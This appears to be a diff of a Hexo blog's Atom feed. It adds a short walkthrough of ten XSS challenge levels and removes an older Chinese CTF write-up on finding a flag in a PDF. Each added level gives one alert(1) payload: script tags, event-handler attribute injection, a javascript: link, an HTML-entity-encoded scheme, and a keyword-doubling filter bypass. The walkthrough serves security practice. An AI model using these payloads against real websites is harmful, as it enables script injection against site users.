@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2021-01-31T03:09:48.688Z</updated>
+  <updated>2021-02-11T05:22:37.399Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XSS-challenge-tour</title>
+    <link href="http://yoursite.com/2021/02/11/XSS-challenge-tour/"/>
+    <id>http://yoursite.com/2021/02/11/XSS-challenge-tour/</id>
+    <published>2021-02-11T03:56:00.000Z</published>
+    <updated>2021-02-11T05:22:37.399Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="#level1"></a>#level1</h3><p><img src="/images/pasted-256.png" alt="upload successful"><br>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h3 id="level2"><a href="#level2" class="headerlink" title="#level2"></a>#level2</h3><p><img src="/images/pasted-257.png" alt="upload successful"><br>payload:<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h3 id="level3"><a href="#level3" class="headerlink" title="#level3"></a>#level3</h3><p><img src="/images/pasted-258.png" alt="upload successful"><br>payload:<code>&#39; onmouseover=&#39;alert(1)</code></p><h3 id="level4"><a href="#level4" class="headerlink" title="#level4"></a>#level4</h3><p><img src="/images/pasted-259.png" alt="upload successful"><br>payload:<code>&quot;onmouseover=&quot;alert(1)</code></p><h3 id="level5"><a href="#level5" class="headerlink" title="#level5"></a>#level5</h3><p><img src="/images/pasted-260.png" alt="upload successful"><br>payload:<code>xxx&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;</code></p><h3 id="level6"><a href="#level6" class="headerlink" title="#level6"></a>#level6</h3><p><img src="/images/pasted-261.png" alt="upload successful"><br>payload:<code>111&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p><h3 id="level7"><a href="#level7" class="headerlink" title="#level7"></a>#level7</h3><p><img src="/images/pasted-263.png" alt="upload successful"><br>payload:<code>xx&quot; oonnmouseover=&quot;alert(1)</code></p><h3 id="level8"><a href="#level8" class="headerlink" title="#level8"></a>#level8</h3><p><img src="/images/pasted-264.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p><h3 id="level9"><a href="#level9" class="headerlink" title="#level9"></a>#level9</h3><p><img src="/images/pasted-265.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p><h3 id="level10"><a href="#level10" class="headerlink" title="#level10"></a>#level10</h3><p><img src="/images/pasted-266.png" alt="upload successful"><br>payload:<code>?t_sort=&quot; onclick=&quot;alert(1)&quot; type=</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;level1&quot;&gt;&lt;a href=&quot;#level1&quot; class=&quot;headerlink&quot; title=&quot;#level1&quot;&gt;&lt;/a&gt;#level1&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-256.png&quot; alt=&quot;upload succes
+      
+    
+    </summary>
+    
+    
+      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Ctfhub-wp</title>
@@ -418,27 +442,6 @@
     
     
       <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>一个抢红包引发的血案</title>
-    <link href="http://yoursite.com/2019/11/18/%E4%B8%80%E4%B8%AA%E6%8A%A2%E7%BA%A2%E5%8C%85%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"/>
-    <id>http://yoursite.com/2019/11/18/一个抢红包引发的血案/</id>
-    <published>2019-11-18T05:59:00.000Z</published>
-    <updated>2020-02-04T09:01:26.361Z</updated>
-    
-    <content type="html"><![CDATA[<p>题目下载 <a href="https://pan.baidu.com/s/1mkd236C" target="_blank" rel="noopener">https://pan.baidu.com/s/1mkd236C</a><br>Tips 文件结构:<br><a href="http://blog.csdn.net/hetoby/article/details/51365460" target="_blank" rel="noopener">http://blog.csdn.net/hetoby/article/details/51365460</a></p><a id="more"></a><p>010editor分析<br>下载PDF模版<br>在obj开头 endbo之间寻找<br><img src="/images/pasted-161.png" alt="upload successful"><br>0x66 0x6c 0x61 0x 67 = flag<br>0x7b = {<br>猜想中文编码<br><a href="http://www.qqxiuzi.cn/bianma/zifuji.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/zifuji.php</a><br>GB2312编码解码<br>flag{烫烫烫锟斤拷锘锘锘屯屯屯}</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;题目下载 &lt;a href=&quot;https://pan.baidu.com/s/1mkd236C&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1mkd236C&lt;/a&gt;&lt;br&gt;Tips 文件结构:&lt;br&gt;&lt;a href=&quot;http://blog.csdn.net/hetoby/article/details/51365460&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.csdn.net/hetoby/article/details/51365460&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
     
     
   </entry>
